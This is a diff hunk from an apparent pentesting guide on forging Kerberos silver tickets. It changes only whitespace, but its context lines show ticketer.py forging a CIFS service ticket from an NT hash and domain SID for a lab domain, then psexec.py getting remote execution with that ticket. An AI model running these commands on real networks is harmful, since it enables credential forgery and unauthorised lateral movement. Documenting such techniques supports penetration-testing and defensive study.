@@ -10,7 +10,7 @@ It also must be taken into account that it is possible to forge tickets using th
 
 {% code title="Linux" %}
 ```bash
-python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park  stegosaurus
+python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
 python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
 ```
